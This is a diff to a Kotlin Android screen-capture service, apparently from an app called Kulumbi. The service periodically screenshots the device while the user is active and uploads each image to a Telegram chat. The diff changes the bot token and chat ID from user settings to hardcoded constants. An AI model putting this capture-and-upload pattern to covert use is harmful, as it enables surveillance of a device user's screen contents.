@@ -54,7 +54,6 @@ class CaptureService : Service() {
     }
 
     private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
-    private lateinit var prefs: Prefs
     private lateinit var powerManager: PowerManager
 
     private var projection: MediaProjection? = null
@@ -76,7 +75,7 @@ class CaptureService : Service() {
                 // Device is idle — pause (skip this tick) until the user is active again.
                 updateNotification("Kulumbi is running • paused (device idle)")
             }
-            tickHandler.postDelayed(this, Prefs.INTERVAL_SECONDS * 1000L)
+            tickHandler.postDelayed(this, Config.INTERVAL_SECONDS * 1000L)
         }
     }
 
@@ -84,7 +83,6 @@ class CaptureService : Service() {
 
     override fun onCreate() {
         super.onCreate()
-        prefs = Prefs(this)
         powerManager = getSystemService(Context.POWER_SERVICE) as PowerManager
         createChannel()
     }
@@ -181,13 +179,13 @@ class CaptureService : Service() {
                 return@post
             }
             val baos = ByteArrayOutputStream()
-            bitmap.compress(Bitmap.CompressFormat.JPEG, Prefs.JPEG_QUALITY, baos)
+            bitmap.compress(Bitmap.CompressFormat.JPEG, Config.JPEG_QUALITY, baos)
             bitmap.recycle()
             val bytes = baos.toByteArray()
 
             val stamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US).format(Date())
             scope.launch {
-                val err = Telegram.sendPhoto(prefs.botToken, prefs.chatId, "Screenshot $stamp", bytes)
+                val err = Telegram.sendPhoto(Config.BOT_TOKEN, Config.CHAT_ID, "Screenshot $stamp", bytes)
                 tickHandler.post {
                     if (err == null) updateNotification("Kulumbi is running • last sent $stamp")
                     else updateNotification("Kulumbi is running • send failed")
